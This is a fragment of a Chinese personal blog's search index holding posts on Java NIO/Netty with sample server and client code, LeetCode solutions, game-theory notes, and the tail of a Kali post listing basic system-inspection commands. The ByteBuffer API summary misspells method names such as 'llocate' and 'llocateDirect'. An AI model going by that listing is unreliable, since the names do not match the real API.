-L -n, netstat -rn</span><br><span class="line">    uname -a, ps aux 查看操作系统信息，进程信息</span><br><span class="line">    dpkg -l | head  查看安装的软件</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Netty编程之NIO实践</title>
    <url>/2020/03/17/Netty%E7%BC%96%E7%A8%8B%E4%B9%8BNIO%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><blockquote><p>最近在学习Netty，其核心便是基于Java的NIO编程封装而来，这篇文章对NIO编程的原理进行介绍，并提供一个NIO编程的完整实践案例。</p></blockquote><a id="more"></a><h3 id="什么是Netty"><a href="#什么是Netty" class="headerlink" title="什么是Netty?"></a>什么是Netty?</h3><blockquote><p>Netty的特点总结如下：</p></blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9OZXR0eS8xMDA2MTYyND9mcj1hbGFkZGlu">Netty<i class="fa fa-external-link-alt"></i></span>是由JBOSS提供的一个Java开源框架，现在为Github上的独立开发项目。</li><li>Netty是一个异步的、基于事件驱动的网络应用框架，用以快速开发高性能、高可靠性的网络IO程序。</li><li>Netty主要针对在TCP协议下，面向Clients端的高并发应用，或者<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGluc2Fuc2h1L3AvNTU0Njk0OC5odG1s">Peer-to-Peer<i class="fa fa-external-link-alt"></i></span>场景下的大量数据持续传输的应用。</li><li>Netty的本质是一个NIO框架，用于服务器通信。</li></ul><hr><h3 id="Java网络编程三兄弟：BIO、NIO、NIO2-AIO"><a href="#Java网络编程三兄弟：BIO、NIO、NIO2-AIO" class="headerlink" title="Java网络编程三兄弟：BIO、NIO、NIO2(AIO)"></a>Java网络编程三兄弟：BIO、NIO、NIO2(AIO)</h3><hr><blockquote><p>显然NIO是Netty的灵魂，由于NIO属于Java三大I/O模型之一，要学习它不如把这三者合在一起先做个了解。</p></blockquote><table><thead><tr><th>I/O模型</th><th align="center">类型</th><th>描述</th></tr></thead><tbody><tr><td>Java BIO</td><td align="center">同步阻塞（传统阻塞型）</td><td>服务器实现模式为<strong>一个连接绑定一个线程</strong>即客户端有一个连接，当有客户端请求时，就需要启动一个线程进行处理。如果这个连接不做任何事情则造不必要的线程开销。</td></tr><tr><td>Java NIO</td><td align="center">同步非阻塞</td><td>服务器实现模式为<strong>一个线程处理多个请求</strong>，即客户端发送的请求会注册到多路复用器上，多路复用器可以轮询存在的I/O请求进行处理。</td></tr><tr><td>Java AIO</td><td align="center">异步非阻塞</td><td>AIO引入异步通道的概念，采用Proactor模式，简化了程序的编写，有效的请求才启动线程，它的特点是先由操作系统完成后才通知服务端程序启动线程去处理，一般适用于连接数较多且连接时间较长的应用。</td></tr></tbody></table><hr><h3 id="NIO核心原理"><a href="#NIO核心原理" class="headerlink" title="NIO核心原理"></a>NIO核心原理</h3><p><code>NIO</code>由三大核心部分组成：</p><ul><li><code>Channel</code>：通道。</li><li><code>Buffer</code>：缓冲区。</li><li><code>Selector</code>：选择器。</li></ul><p>原理说明：</p><hr><blockquote><ul><li>每个<code>Channel</code>对应一个<code>Buffer</code>。</li><li><code>Selector</code>对应一个线程，一个线程对应多个<code>Channel</code>。</li><li>多个<code>Channel</code>可以注册到一个<code>Selector。</code></li><li>程序切换Channel由事件决定。</li><li><code>Selector</code>会根据不同事件，在各个<code>Channel</code>切换。</li><li>数据的读取或者写入通过<code>Buffer</code>，是双向的，但需要<code>flip()</code>切换读/写模式。</li><li><code>Channel</code>是双向的，可以返回底层操作系统的情况（比如<code>Linux</code>底层是双向的）。</li></ul></blockquote><hr><p><strong>NIO模式示意图如下：</strong><br><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/NIO.png" alt="NIO示例图" style="zoom:80%"></p><hr><h4 id="关于Channel"><a href="#关于Channel" class="headerlink" title="关于Channel"></a>关于Channel</h4><blockquote><p>基本介绍:</p></blockquote><ol><li><code>BIO</code>中的<code>stream</code>是单向的，例如<code>FileInputStream</code> 对象只能进行读取数据的操作，而NIO中的通道(<code>Channel</code>)是双向的，可以读操作，也可以写操作。</li><li><code>Channel</code>在<code>NIO</code>中是一 个接口：<font color="green"><strong>public interface Channel extends Closeable{}</strong></font>。</li><li>常用的<code>Channel</code>类有: <code>FileChannel</code>、<code>DatagramChannel</code>、<code>ServerSocketChannel</code> 和<code>SocketChannel</code>。<font color="green"><strong><code>ServerSocketChannel</code>类似<code>ServerSocket</code>，<code>SocketChannel</code>类似<code>Socket</code></strong></font></li><li><code>FileChannel</code> 用于文件的数据读写，<code>DatagramChannel</code>用于<code>UDP</code>的数据读写，<code>ServerSocketChannel</code>和<code>SocketChannel</code>用于<code>TCP</code>的数据读写。</li></ol><hr><h4 id="关于Buffer"><a href="#关于Buffer" class="headerlink" title="关于Buffer"></a>关于Buffer</h4><blockquote><p>Java的基本数据类型（除了boolean）均有一个Buffer类与之对应，最常用的自然是<code>ByteBuffer</code>类，该类的主要方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ByteBuffer</span></span>&#123;</span><br><span class="line">        <span class="comment">//缓冲区创建相关api</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocateDirect</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//创建直接缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">llocate</span><span class="params">(<span class="keyword">int</span> capacty)</span><span class="comment">//设置缓冲区的初始容量</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array)</span><span class="comment">//把个数组放到缓冲区中使用</span></span></span><br><span class="line"><span class="function">        <span class="comment">//构造初始化位置ofset和上界length的缓冲区</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">static</span> ByteBuffer <span class="title">wrap</span><span class="params">(<span class="keyword">byte</span>[] array,<span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function">        <span class="comment">//缓存区存取相关API</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span><span class="params">( )</span><span class="comment">//从当前位置position上get, get之后， position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span> <span class="title">get</span> <span class="params">(<span class="keyword">int</span> index)</span></span>;<span class="comment">//从绝对位置get</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">byte</span> b)</span>:<span class="comment">//从当前位置上添加，put之后，position会自动+1</span></span></span><br><span class="line"><span class="function">        <span class="keyword">public</span> <span class="keyword">abstract</span> ByteBuffer <span class="title">put</span> <span class="params">(<span class="keyword">int</span> index, <span class="keyword">byte</span> b)</span></span>;<span class="comment">//从绝对位置上put</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="关于Selector"><a href="#关于Selector" class="headerlink" title="关于Selector"></a>关于Selector</h4><blockquote><p>Selector类是一个抽象类，常用的方法如下：</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Selector</span> <span class="keyword">implements</span> <span class="title">Closeable</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Selector <span class="title">open</span><span class="params">()</span></span>;<span class="comment">//得到一个选择器对象</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">long</span> timeout)</span></span>;<span class="comment">//监控所有注册的通道，当其中有10操作可以进行时，将对应的										//SelectionKey加入到内部集合中并返回，参数用来设置超时时间</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Set&lt;SelectionKey&gt; <span class="title">selectedKeys</span><span class="params">()</span></span>;<span class="comment">// 从内部集合中得到所有的SelectionKey</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NIO编程流程"><a href="#NIO编程流程" class="headerlink" title="NIO编程流程"></a>NIO编程流程</h3><div class="note success"><ol><li>当客户端需要连接时，通过<code>ServerSocketChannel</code>得到<code>SocketChannel</code>对象。</li><li>将该<code>SocketChannel</code>对象注册到<code>Selector</code>上，使用<code>register(Selector sel)</code>方法，在一个<code>selector</code>上可以注册多个<code>SocketChannel</code>对象。（<strong>将监听服务通道和监听到的对象通道均注册到Selector</strong>）</li><li>注册后返回一个<code>SelectionKey</code>，会和该<code>Selector</code>关联（集合）。</li><li><code>Selector</code>进行监听<code>select</code>方法，返回有事件发生的通道个数。</li><li>进一步得到各个<code>SelectionKey</code>。</li><li>通过使用<code>SelectionKey</code>的<code>channel()</code>方法反向获取<code>SocketChannel</code>。</li><li>通过得到的<code>channel</code>完成业务处理。</li></ol></div><hr><h3 id="NIO代码实践—简单的多用户聊天服务场景"><a href="#NIO代码实践—简单的多用户聊天服务场景" class="headerlink" title="NIO代码实践—简单的多用户聊天服务场景"></a>NIO代码实践—简单的多用户聊天服务场景</h3><h4 id="服务端：NIOServer"><a href="#服务端：NIOServer" class="headerlink" title="服务端：NIOServer"></a>服务端：NIOServer</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//创建ServerSocketChannel</span></span><br><span class="line">        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//得到一个selector对象</span></span><br><span class="line">        Selector selector = Selector.open();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绑定一个端口6666，在服务器端监听</span></span><br><span class="line">        serverSocketChannel.socket().bind(<span class="keyword">new</span> InetSocketAddress(<span class="number">6666</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置为非阻塞</span></span><br><span class="line">        serverSocketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把serverSocketChannel注册到selector，关心的实践为OP_ACCEPT</span></span><br><span class="line">        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//循环等待客户端连接</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//等待1秒，如果没有事件发生，继续</span></span><br><span class="line">            <span class="keyword">if</span>(selector.select(<span class="number">1000</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="comment">//没有事件发生</span></span><br><span class="line">                System.out.println(<span class="string">"服务器等待了1秒，无连接"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果返回的&gt;0,就获取到相关的SelectionKey集合</span></span><br><span class="line">            <span class="comment">//selectionKeys是关注事件的集合</span></span><br><span class="line">            <span class="comment">//通过selectionKeys反向获取通道</span></span><br><span class="line">            Set&lt;SelectionKey&gt; selectionKeys = selector.selectedKeys();</span><br><span class="line">            <span class="comment">//遍历selectionKeys，使用迭代器！！</span></span><br><span class="line">            Iterator&lt;SelectionKey&gt; keyIterator = selectionKeys.iterator();</span><br><span class="line">            <span class="keyword">while</span> (keyIterator.hasNext())&#123;</span><br><span class="line">                <span class="comment">//获取到SelectionKey</span></span><br><span class="line">                SelectionKey key = keyIterator.next();</span><br><span class="line">                <span class="comment">//根据key对应通道发生的事件做相应的处理</span></span><br><span class="line">                <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                    <span class="comment">//有新的客户端连接</span></span><br><span class="line">                    <span class="comment">//给该客户端生成一个SocketChannel</span></span><br><span class="line">                    <span class="comment">//注意：这里已经知道实际的类型，所以下面的accept()方法</span></span><br><span class="line">                    <span class="comment">//并不会阻塞</span></span><br><span class="line">                    SocketChannel socketChannel = serverSocketChannel.accept();</span><br><span class="line">                    System.out.println(<span class="string">"客户端连接成功，生成了一个通道 "</span>+</span><br><span class="line">                            socketChannel.hashCode());</span><br><span class="line">                    <span class="comment">//将通道设置为非阻塞</span></span><br><span class="line">                    socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">                    <span class="comment">//将当前的socketChannel注册到selector，关注事件为</span></span><br><span class="line">                    <span class="comment">//OP_READ(从通道读入到缓冲区)，同时给该socketChannel关联一个buffer</span></span><br><span class="line">                    socketChannel.register(selector,SelectionKey.OP_READ,</span><br><span class="line">                            ByteBuffer.allocate(<span class="number">1024</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                    <span class="comment">//发生一个OP_READ事件</span></span><br><span class="line">                    <span class="comment">//通过key,反向获取对应的通道</span></span><br><span class="line">                    <span class="comment">//SelectableChannel向下转型为SocketChannel</span></span><br><span class="line">                    SocketChannel channel = (SocketChannel) key.channel();</span><br><span class="line">                    <span class="comment">//获取到该通道关联的buffer</span></span><br><span class="line">                    ByteBuffer buffer = (ByteBuffer)key.attachment();</span><br><span class="line">                    channel.read(buffer);</span><br><span class="line">                    System.out.println(<span class="string">"From 客户端："</span>+<span class="keyword">new</span> String(buffer.array()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//手动从集合中移除SelectionKey，防止重复操作</span></span><br><span class="line">                keyIterator.remove();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="客户端：NIOClient"><a href="#客户端：NIOClient" class="headerlink" title="客户端：NIOClient"></a>客户端：NIOClient</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tosang.nio;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.SocketChannel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> tosang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020/3/17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NIOClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//得到一个网络通道</span></span><br><span class="line">        SocketChannel socketChannel = SocketChannel.open();</span><br><span class="line">        <span class="comment">//设置非阻塞模式</span></span><br><span class="line">        socketChannel.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">        <span class="comment">//提供服务器端的IP和端口</span></span><br><span class="line">        InetSocketAddress inetSocketAddress = <span class="keyword">new</span> InetSocketAddress(<span class="string">"127.0.0.1"</span>, <span class="number">6666</span>);</span><br><span class="line">        <span class="comment">//连接服务器</span></span><br><span class="line">        <span class="comment">//其中socketChannel.connect判断远程连接是否建立成功</span></span><br><span class="line">        <span class="comment">//socketChannel.finishConnect()判断channel's socket是否连接</span></span><br><span class="line">        <span class="keyword">if</span>(!socketChannel.connect(inetSocketAddress))&#123;</span><br><span class="line">            <span class="keyword">while</span> (!socketChannel.finishConnect())&#123;</span><br><span class="line">                System.out.println(<span class="string">"因为连接需要时间，客户端不会阻塞，可以继续工作"</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果连接成功则发生数据</span></span><br><span class="line">        String str = <span class="string">"hello ,小yi"</span>;</span><br><span class="line">        <span class="comment">//wrap()包裹的含义，返回一个与str大小相等的buffer</span></span><br><span class="line">        <span class="comment">//等价于ByteBuffer buffer = ByteBuffer.allocate(str.getBytes().length);</span></span><br><span class="line">        ByteBuffer buffer = ByteBuffer.wrap(str.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//发生数据，将buffer写入通道</span></span><br><span class="line">        socketChannel.write(buffer);</span><br><span class="line">        <span class="comment">//客户端停在此处</span></span><br><span class="line">        System.in.read();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note warning"><p>启动<code>NIOServer</code>和多个<code>NIOClient</code>，可以看到打印的<code>hashcode</code>值不相等，说明一个<code>Selector</code>同时管理着多个连接。</p></div>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>NIO</tag>
        <tag>网络编程</tag>
      </tags>
  </entry>
  <entry>
    <title>33. 搜索旋转排序数组</title>
    <url>/2020/03/10/33-%E6%90%9C%E7%B4%A2%E6%97%8B%E8%BD%AC%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note primary"><p>假设按照升序排序的数组在预先未知的某个点上进行了旋转。( 例如，数组 <code>[0,1,2,4,5,6,7]</code> 可能变为 <code>[4,5,6,7,0,1,2]</code> )。搜索一个给定的目标值，如果数组中存在这个目标值，则返回它的索引，否则返回 <code>-1</code> 。你可以假设数组中不存在重复的元素。你的算法时间复杂度必须是 <code>O(log n)</code> 级别。</p></div><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="note success"><p>该题有两个关键点：</p><ol><li>如何理解旋转：题中的旋转是在一个<strong>点</strong>旋转，所以对于数组如<code>[1,2,3]</code>，不存在类似这样的旋转结果：<code>[3,2,1]</code></li><li>要求时间复杂度为 <code>O(logn)</code>，很容易想到应该用二分法，但关键在于如何讨论出所有可能情况。</li></ol></div><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//二分查找:分三种情况，左边有序，右边有序，左右都有序</span></span><br><span class="line">        <span class="comment">//使用位运算代替乘除法（常用的优化办法）</span></span><br><span class="line">        <span class="keyword">int</span> len = nums.length;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = len-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(len == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            mid = (left+right)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左右都有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&lt;=nums[mid]&amp;&amp;nums[mid]&gt;=nums[right])&#123;<span class="comment">//左边有序，右边无序</span></span><br><span class="line">                <span class="keyword">if</span>(target&gt;nums[mid])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&lt;nums[mid]&amp;&amp;target&lt;nums[left])</span><br><span class="line">                    left = mid + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[left]&gt;=nums[mid]&amp;&amp;nums[mid]&lt;=nums[right])&#123;<span class="comment">//左边无序，右边有序</span></span><br><span class="line">                <span class="keyword">if</span>(target&lt;nums[mid])</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&gt;nums[mid]&amp;&amp;target&gt;nums[right])</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> </span><br><span class="line">                    left  = mid + <span class="number">1</span>;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><div class="note warning"><p>不得不说位运算是个神器，时间消耗只有传统乘除法的<code>1/4</code>，同时位运算也是实现乘除法的一种办法。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>28. 实现 strStr()--简单难度？</title>
    <url>/2020/03/07/28-%E5%AE%9E%E7%8E%B0-strStr-%E7%AE%80%E5%8D%95%E9%9A%BE%E5%BA%A6%EF%BC%9F/</url>
    <content><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><div class="note default"><p>给定一个 haystack 字符串和一个 needle 字符串，在 haystack 字符串中找出 needle 字符串出现的第一个位置 (从0开始)。如果不存在，则返回 -1。</p></div><a id="more"></a><h3 id="Sunday算法"><a href="#Sunday算法" class="headerlink" title="Sunday算法"></a>Sunday算法</h3><div class="note info"><p>这是一道字符串匹配的常见题型，常规算法两个for循环解决；但是，除了KMP这种不太容易手撕的算法外，Sunday算法可以说是一种非常容易理解和实现的算法。</p></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//sunday算法Java实现</span></span><br><span class="line">    <span class="keyword">int</span> MAXSIZE = <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">int</span> moveLength[] = <span class="keyword">new</span> <span class="keyword">int</span>[MAXSIZE];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">strStr</span><span class="params">(String haystack, String needle)</span> </span>&#123;</span><br><span class="line">        getMoveLength(needle);</span><br><span class="line">        <span class="keyword">int</span> len1 = haystack.length();</span><br><span class="line">        <span class="keyword">int</span> len2 = needle.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(needle==<span class="keyword">null</span>||<span class="string">""</span>.equals(needle))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len1) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(  ;j &lt; len2 &amp;&amp; i + j &lt; len1 &amp;&amp; haystack.charAt(i + j) == needle.charAt(j); ++ j);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(j &gt;= len2) <span class="keyword">return</span> i;</span><br><span class="line">            <span class="keyword">if</span>(i + len2 &gt;= len1)</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            i+=moveLength[haystack.charAt(i + len2)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">getMoveLength</span><span class="params">(String needle)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//关键！，根据256种字符类型而不是needle串中的字符确定移动步数</span></span><br><span class="line">        <span class="keyword">int</span> len = needle.length();   </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i &lt; MAXSIZE; ++ i)</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">            moveLength[i] = len + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;len ; ++ i)&#123;</span><br><span class="line">            moveLength[needle.charAt(i)] = len - i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h3><div class="note primary"><p>从前往后匹配，每次匹配过程的末尾的下一位去检查该字符是否存在于模式串中：</p><ol><li><p>若存在于模式串中，则返回<code>i</code>的移动步数<code>move=</code>模式串长度<code>-</code> 所在字符的位置最后一个出现位置</p></li><li><p>若不存在，则<code>move</code>=模式串长度<code>+</code>1</p></li></ol><p>算法本身其实很容易理解，主要在实现查询办法时需要注意，每次去模式串中查找某个字符效率会比较低下，且算法设计很冗余，较好的办法可以如上述代码，<strong>设计一个大小为<code>256</code>的数组</strong>，用于存储每个字符的移动步数，这样检索时不会有重复检索问题，效率会高不少。</p></div><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><div class="note warning"><p>缺点很明显，主要有两点：</p><ol><li><p>即已经匹配的部分字符串完全没有利用，被浪费。</p></li><li><p><code>Sunday</code>算法的效率受到匹配串和模式串的影响。</p><p>主串：baaaabaaaabaaaabaaaa</p><p>模式串：aaaaa</p><p>这个模式串使得move[a]的值为1，即每次匹配失败时，只让模式串向后移动一位再进行匹配。这样就让Sunday算法的时间复杂度飙升到了<code>O(m*n)</code>，即字符串匹配常规情况。</p></li></ol><p>此外，不得不吐槽的是，<code>Leetcode</code>官方认为这道题时简单题，给出的数据完全对Sunday算法不利，反而常规算法这道题效率更高。</p></div>]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>博弈论学习（一）</title>
    <url>/2020/03/03/%E5%8D%9A%E5%BC%88%E8%AE%BA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h4 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h4><div class="note success"><ul><li>不要选择劣势策略。</li><li>理性的选择导致非最优结果。</li><li>想获得某些事物之前必定要试图做/了解他。</li><li>站在别人的立场上分析他们会怎么做。</li><li>耶鲁大学的学生很自私（2333）。</li></ul></div>]]></content>
      <categories>
        <category>课程学习</category>
      </categories>
  </entry>
  <entry>
    <title>Hexo + GitPages + PicGo搭建你的第一个静态个人博客教程（踩坑实践）</title>
    <url>/2020/03/01/hexo-gitpages-picgo%E6%90%AD%E5%BB%BA%E4%BD%A0%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
